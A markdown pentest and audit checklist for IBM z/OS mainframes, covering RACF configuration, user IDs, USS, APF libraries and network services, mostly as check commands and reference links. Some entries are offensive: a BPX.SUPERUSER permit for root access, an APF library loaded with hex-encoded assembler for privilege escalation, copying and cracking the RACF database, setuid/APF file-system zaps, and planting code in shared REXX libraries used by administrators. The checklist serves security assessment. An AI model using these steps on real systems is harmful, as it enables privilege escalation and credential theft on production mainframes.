```
  ╔═╛                    ╘═╗
 ┊║  ⊏r@sH ⊏☺urs3 t☺ ℤ╱ʘS  ║┊
  ╚═╕                    ╒═╝
 ```
  
# ToC

- [Intro](#intro)
- [Recon](#recon)
- [RACF](#racf)
- [System auditing configuration](#system-auditing-configuration)
- [Userids (individual)](#userids-individual)
- [Userids (global)](#userids-global)
- [OMVS/USS](#omvsuss)
- [OPERCMD profiles](#opercmd-profiles)
- [Generic system](#generic-system)
- [Generic network](#generic-network)
- [TOP10 z/OS vulnerabilities](#top10-zos-vulnerabilities )
- [Tools](#tools)
- [Benchmarks & STIGs](#benchmarks--stigs)

## Intro

For too long ...

## Recon

Obtaining system version and generic information.

- Information present on the login screen
- Check syslog messages in SDSF
- In the z/OS master console run:

  `d iplinfo`
    
  `d m=cpu`
    
  `d prog,reg`
    
  `d XCF`
    
  `d prog,apf`
    
  `d prog,exit`
    
  `d smf,o`
    
  `d sms,options`
    
  `d ios,config`
    
  `d xcf,sysplex`
    
  `d consoles`
 
- In OMVS/USS session run:
 
  `uname -a`
    
- Use IODF to check for hardware & I/O configuration if installed:

  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ieag800/iea3g814.htm

- General:

  http://www.longpelaexpertise.com.au/ezine/FindSoftware.php

## RACF

Testing various RACF aspects.

- Are the RACF recovery scenarios/mechanisms/tools prepared, in place and tested?
- Check RACF status and datasets location(s):

  `rvary` // in TSO
    
- List and check RACF currently configured options:

  `setr list` // in TSO
    
- Check if RACF is synchronized with Active Directory/LDAP etc.
  Compromising credentials stored/used by these systems can provide you with access to z/OS.
  Is RACFEVNT class active and NOTIFY.LDAP.USER is defined?

  ftp://public.dhe.ibm.com/s390/zos/racf/pdf/nyrug_2004_04_heterogeneous_password_sync.pdf

  https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.icha700/pwenv.htm

- Check if PROTECT-ALL is active, also its value should be set to FAIL:

  `setr list` // in TSO
    
  `setr protectall(fail)` // in TSO
    
  https://www.stigviewer.com/stig/zos_racf/2015-06-24/finding/V-276
    
- Locate copies and unloads of the RACF database

  `TODO`

- Generate and review RACF reports (e.g. violations, see JCLs for details):

  `racfrw`  // in TSO
    
  `IRRDBU00`  // in TSO
    
  https://www.ibm.com/support/knowledgecenter/SSB27U_6.3.0/com.ibm.zvm.v630.icha8/icha8158.htm
    
- Check for WARNING mode set on dataset profiles. If so, it will log an event warning but will allow action anyway:
    
  `sr class(dataset) warning` // in TSO
    
- Check users with SPECIAL, OPERATIONS, AUDITOR, CLAUTH attributes set for both, group-level and system-wide.
  The OPERATION attribute in 99.9% shouldn't be granted at all.

  `setr list` //in TSO check if SAUDIT and OPERAUDIT attributes are set
    
  `ICHDSM0` // DSMON reports
    
  https://www.ibm.com/support/knowledgecenter/SSLTBW_1.13.0/com.ibm.zos.r13.icha800/ichza8c087.htm // Selected User Attribute Report
    
- Check PRIVILEGED vs. TRUSTED profiles. Same privs but TRUSTED is fully audited and should be used instead of PRIVILEGED.

  `ICHDSM0` // DSMON reports
    
- Check if AUDIT(ALL(READ)) is set on RACF and any copy of it:

  `TODO`
    
- Except UACC of the profile, check access list to the given dataset(s):
    
  `TODO`

## System auditing configuration
- Obtain and review reports generated by auditing settings:

  `TODO`

- Is the system integrated with external logging/monitoring system such as SIEM?
- Is RACF configured to verify signed programs (File Integrity Monitoring)?

  https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.2.0/com.ibm.zos.v2r2.icha700/svpsets.htm

- Check global auditing options set

  `setr list` // in TSO
  
  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.icha800/control.htm
      
## Userids (individual)
- Check if you can see the userids in the ISPF command history datasets which can contain passwords, e.g. in ISPF view the following dataset:

  `USERID.spflogX.list`
    
- Check if you can see in the SDSF output of jobs run by other userids:

  `TODO`

- Check userid basic account info:

  `lu userid` // in TSO
    
## Userids (global)
- Check if the default credentials are used in the system:

  https://github.com/mainframed/TSO-Brute
  
- Check if any started tasks run as IBMUSER:

  `TODO`
  
- Check password policy:

  `setr list` // in TSO
  
  `=m.3.5.1`  // in ISPF
  
  `setr password(interval(30) minchange(0))`  // in TSO
  
  `setr mixedcase`  // in TSO
  
  `IRRDBU00`  // check USBD_PWD_ASIS field and if userid password is case sensitive
  
  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.icha700/maxmin.htm
  
  https://www.ibm.com/support/knowledgecenter/SSB27U_6.3.0/com.ibm.zvm.v630.icha3/ubdr.htm
  
- Check for userids having access to TSO/OMVS/ISPF:

  `lu *`  // in TSO
    
  `listgrp *` // in TSO
    
- Check surrogate userids (sudo-like accounts) present in the system:
  
  `sr class(surrogat)`  // in TSO
  
- Check session timeouts, e.g. JWT/SWT/TWT parameters:

  `d parmlib` // in master console
    
  `=3.4` // in ISPF, PARMLIB datasets from previous command and SMFPRMxx member
    
  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.ieae200/smfparm.htm // TSO/started tasks
  
  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.bpxb200/jwtime.htm // OMVS / USS
  
- Check who has got ALTER/UPDATE access to the APF authorised libraries:

  - reside in datasets flagged as APF-authorized
  - ISRDDN
  - IPLINFO     REXX    Exec
  - TASID
  - TSO IPLINFO APF
    
  https://github.com/ayoul3/Privesc/blob/master/ELV.APF
    
- Check which userids can update SYS1.PARMLIB (master catalog):

  `TODO`
  
- Check if SYS1.UADS contains any entries and validate userids if it does.
  Check if userids defined in this dataset are marked as PROTECTED in RACF.
  If an ACP is used for managing security accesses then SYS1.UADS dataset should have set UACC(NONE).
  Otherwise users can assign special attributes to their userids using this file.

  https://www.stigviewer.com/stig/zos_racf/2015-06-24/finding/V-184
  
  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ikjb400/part3.htm
  
  http://mainframed767.tumblr.com/post/81610008641/sys1uads-you-shouldnt-have
  
- Is user access recertification set?

  `TODO`

- Are meltdown patches applied? OSPROTECT=SYSTEM or OSPROTECT=1 in IEASYSxx (APAR OA55233).
  Only works if thee appropriate MCLs areapplied.

## OMVS/USS

Finally something you can recognise! Hack it as usual *nices with some twists.

- If BPX.DAEMON is not defined then assuming other userids identities is possible:

  `TODO`

- Privelege escalation vector: as SPECIAL userid set BPX.SUPERUSER (su root without passwd) for USS:
  
  ```
  PERMIT BPX.SUPERUSER CLASS(FACILITY) ID(USERID) ACCESS(READ)
  SETROPTS GENERIC(FACILITY) REFRESH
  ```
  
- Check for SUID programs:

  `TODO: find / ...`
  
- Check filesystem privs (files/dirs):

  `ls -laR /`

- Check for these sensitive permissions being set:

  - SUPERUSER.FILESYS.CHANGEPERMS
  - SUPERUSER.FILESYS.CHOWN 
  - BPX.SUPERUSER // uid(0) for FACILITY
  - SHARED.IDS
  - CHOWN.UNRESTRICTED
  - FILE.GROUPOWNER.SETGID
  - SUPERUSER.FILESYS.MOUNT
  - SUPERUSER.FILESYS.QUIESCE
  - SUPERUSER.FILESYS.PFSCTL
  - SUPERUSER.FILESYS.VREGISTER
  - SUPERUSER.IPC.RMID
  - SUPERUSER.PROCESS.GETPSENT
  - SUPERUSER.PROCESS.KILL
  - SUPERUSER.PROCESS.PTRACE
  - SUPERUSER.SETPRIORITY
  - SUPERUSER.FILESYS
  - SUPERUSER.FILESYS.ACLOVERRIDE
  - RESTRICTED.FILESYS.ACCESS

## OPERCMD profiles
- Can I ADD my own library to the APF list?

  `TODO`
  
- Can I update PARMLIB and wait for the next IPL?

  `TODO`
   
- Can I update PARMLIB and dynamically add an APF authorised library? 

  `TODO`
  
- Do I have access to MVS.SETPROG.** or even ** in the OPERCMDS class?
 
  `TODO`
  
- Run your own library as APF:

  `SETPROG APF,ADD,DSNAME=MYOWNLIB.LOAD,SMS`
  
  where MYOWNLIB.LOAD contains the following code:

  ```
  A START
  DC X'411000300A6B58F0021CBFFFF154A774000858F0022458FF006C58FF00C896'
  DC X'80F02617FF07FE'
  END A 
  ```
  
  https://share.confex.com/share/123/webprogram/Handout/Session15993/So%20you%20think%20no%20one%20can%20hack.pdf
  
## Generic system
- Check programs that are permitted to break out of the sandbox (all types have to reside in PARMLIB datasets).
  The best (and the hardest) way to do this is by scanning control blocks, these include:
  - User SVCs (stored in the SYS1.NUCLEUS and LPALIST datasets)
  - APF and TSO APF authorizations (stored in APF-authorized datasets)
  - I/O appendages (acquire privs via APF-authorized datasets)
  - Fucntional subsystems (acquire privs via APF-authorized datasets)
  - Exits (assembler or REXX language programs which can modify the logic of standard software; stored in APF-authorized or other system datasets).
  - Programs in Properties Table (programs listed in this table only receive privileges if they reside in APF-authorized libraries).
  - Other methods (e.g. SRB scheduling) to cross address space boundaries.

    `d parmlib`
    `=3.4`  // specifying parmlib datases from the previous command and looking for member beginning with IEASYS*
    `ICHDSM0` // DSMON reports, see JCLs for details

    http://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zsecurity/zsecc_060.htm
    
    http://www.stuhenderson.com/MVSAUDL.pdf
    
- Check who can run/install APF authorized code?
  
  `TODO`
  
- Check poor APF library protections:

  - SYS1.LINKLIB
  - SYS1.SVCLIB
  - SYS1.LPALIB
  - other authorized libraries specified by/during the installation
    
- Check poorly coded SVCs residing in the following datasets:
  - SYS1.NUCLEUS // SVCs
  - SYS1.LPALIB
  - SYS1.LNKLIB
  - SYS1.SVCLIB
  - LINKLIST
  - LPALIST (SVCs) // reenterable routines that are loaded at IPL

  `d PROG,LNKLIST` // in master console
  
  `tso test` // finds SVCs with capability for a normal program to obtain control in Supervisor State instead of using APF
  
- Check programs listed in SYS1.PARMLIB, what means they can call SVCs:

    `d PARMLIB` // in master console
    
- Check JES2/JES3 spool:

    `init`  // in SDSF main menu
    
- Check syslog in SDSF and/or syslog datasets containing syslog entries, i.e. search for password/alu etc. commands that were issued.
    
- Is it possible to use DITTO on catalogs and/or normal datasets?

  `TODO`

- Is it possible to modify/update master catalog for regular users? 

  `TODO`

- Check apps for UIDs/GIDs 0, what means they can access anything within USS but not MVS datasets.
  However, UID=0 can be used to trick others to execute something that will modify RACF/datasets on behalf of an attacker:

  `sr class(user) uid(0)`
  
- Check for shared/mounted resources (disks, LPARs, tapes):

  `TODO`
  
- Check who can modify IODF datasets?

  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ieag800/iea3g814.htm
  
- Check poor surrogat profiles:

  - ** profile with * READ in ACL
  - userid.SUBMIT in WARNING mode
  
- Check what transactions are available for everyone:

  `TODO`
  
- Check if automount options exclude setuid, otherwise datasets prefixed with a userids can be alterted to turn setuid and APF-authorized bits:
  - Access their file system via Unix and copy a program into their home directory
  - Exit Unix and wait for the file system dataset to be unmounted
  - Zap the file system dataset to set the owner of the program to UID 0, turn on the setuid bit, and turn on the APF-authorized bit
  - Access their file system again via Unix, and now when they execute the program, it runs as UID 0 with APF)

- Request and review sources for the JES, RACF and Operating System Exits:
    
  `ICHDSM0` // DSMON reports for finding RACF exits, see JCLs for details
    
- Check who can download/upload files using IND$FILE:

  `TODO`
  
- Check for legacy products, e.g. "Extracting a password from RACF?" from RACF Discussion List (credits naqvi_aman@HOTMAIL.COM):

  ```
    >
    > So that would mean its possible to trigger an authentication
    > (successfully) to RACF with the password/userid in its encrypted form only.
    >
    
    Netview FTP does extract the encrypted password hash from the RACF
    database, sends it to the target system, and authenticates the userid there
    with RACROUTE REQUEST=VERIFY,PASSCHK=YES,PASSWRD=xxx,ENCRYPT=NO.
    ENCRYPT=NO is the magic that tells RACF not to re-encrypt the hash prior
    to comparing it with the one in the database.
    
    Note that this function no longer works when the password is hashed with
    KDFAES on the source system.  The restriction is documented in II14765.
    
    http://www-01.ibm.com/support/docview.wss?uid=isg1II14765
  ```
  
- Run IEBGENER, put RACF db in SYSUT1, then transfer SYSUT2 contents to your box and run JtR (credits R.Skorupka@bremultibank.com.pl):

  `TODO`
    
- Check if there are any NJE/RJE nodes/jobs defined? If so, check security configuration (encryption, passwords etc.):

  `TODO`

- Check if DFDSS can be used to read data dumps:

  `TODO`

- Find CLIST/REXX Libraries that are universally updateable that are not at the bo[om of the list of concatenated datasets find an exec that is lower down in the concatenation that is used by one of the privileged users (Sec Admin, Sysprog etc) copy some code to the universally accessible dataset and add a bit of your own code:
  
  `TODO`

- Find library that contains loads of stuff that all the teams use and we have UPDATE access update a member in the dataset and add a bit of code (e.g. exec 'some.dataset(cmd)'):

  `TODO`
   
## Generic network
- Try to access the following file via FTP/HTTP:

  `/usr/lpp/internet/server_root/Admin/webadmin.passwd`
  
- Try to exploit Shellshock in a CGI scripts hosted via HTTP.

- Check FTP/HTTP for default credentials and/or brute-force with usual tools such as hydra/medusa/msf etc.

- Download RACF db via FTP/HTTP and crack it with JtR (can convert to a flat file with IRRDBU00):

  http://mainframed767.tumblr.com/post/43072129477/how-to-copy-the-racf-database-off-the-mainframe
  
- Check if you can run JCLs via FTP's SITE command:

  https://groups.google.com/forum/#!msg/bit.listserv.ibm-main/thREyEqIn8s/RbKInljcfvYJ
  
  https://github.com/mainframed/MainTP
  
- Perform a typical network pentest.

## TOP10 z/OS vulnerabilities

1. Excessive Number of User ID’s w/No Password Interval
  > If the userid is being used for started tasks or surrogate, it should be reviewed and changed to PROTECTED.
2. Inappropriate Usage of z/OS UNIX Superuser Privilege, UID = 0
3. Data Set Profiles with UACC Greater than READ
4. RACF Database is not Adequately Protected
5. Excessive Access to APF Libraries
6. General Resource Profiles in WARN Mode
  > Even if access authority is insufficient, RACF is to issue a warning message and allow access to the resource.
7. Production Batch Jobs have Excessive Resource Access
  > Review the SMF data for each production batch ID to determine the access required.
8. Data Set Profiles with UACC of READ
9. Improper Use or Lack of UNIXPRIV Profiles
  > UNIXPRIV class resource rules are designed to give a limited subset of the superuser UID (0) capability.
10. Started Task IDs are not Defined as PROTECTED IDs
  > User IDs associated with started tasks should be defined as PROTECTED which will exempt them from revocation due to inactivity or excessive invalid password attempts, as well as being used to sign on to an application.

- https://share.confex.com/share/125/webprogram/Handout/Session17714/S17714%20-%20Top%20Ten%20Security%20Vulnerabilities%20in%20z-OS%20%26%20RACF%20Security.pdf

## Tools
- ISPF (e.g. dataset management)
- ISRDDN (debugging tool, can be used to disasseble modules, view/manipulate files etc.)
- SDSF (e.g syslog viewing)
- DSMON (RACF reports; https://www.ibm.com/support/knowledgecenter/SSLTBW_1.13.0/com.ibm.zos.r13.icha800/dsmon.htm)
- zSecure Audit (IBM Security zSecure Audit license, this product supports a wide range of standard reports and interactive
  selection panels about the USS security and audit parameters that are defined for your file systems.
  For example reports about mount points and attributes, files with extended attribbutes (APF, program controlled, etc.) SUID and SGID files, shared
  UIDs/GIDs, globally writable files and directories, and many more. If applicable, you can also use zSecure Audit to search for and report USS objects with extended ACLs (Access ACL, file default ACL, or directory default ACL)) "zSecure Suite question" @ RACF-L@listserv.uga.edu.
- zAssure by KRI
- vanguard toolset (SecurityCenter/Enforcer/Analyzer/Advisor/Administrator)
- access monitor (investigation tool)
- TASID (displays the SVCTABLEs)
- vanguard policy manager (controls RACF commands and command params)
- detack's epas for maintaining secure passwords
- "rocket software" & vanguard "ez/token" are z/os multi-factor solutions
- https://github.com/sensepost/birp (a la burp but for mainframes console)
- https://github.com/sensepost/mainframe_brute
- https://github.com/ayoul3/cicspwn
- https://github.com/ayoul3/Privesc/blob/master/ELV.APF
- http://www-03.ibm.com/systems/z/os/zos/features/unix/bpxa1svp.html
- http://www-03.ibm.com/systems/z/os/zos/features/unix/bpxa1ty2.html
- http://www.mzelden.com/mvsutil.html (various tools)
- http://www-01.ibm.com/support/docview.wss?uid=swg24009131 (TASID - ispf tool to display sys info)
- http://www.cbttape.org/cbtdowns.htm (showmvs)
- DataSniff from XBridge Systems (data leakage discovery and prevention)
- https://www.krisecurity.com/zassure-vulnerability-analysis-product-vap/
- http://aspg.com/enterprise-and-mainframe-software/data-security/erq/

## Benchmarks & STIGs
- https://www.stigviewer.com/stigs
- https://benchmarks.cisecurity.org/community/editors/groups/single/?group=db2
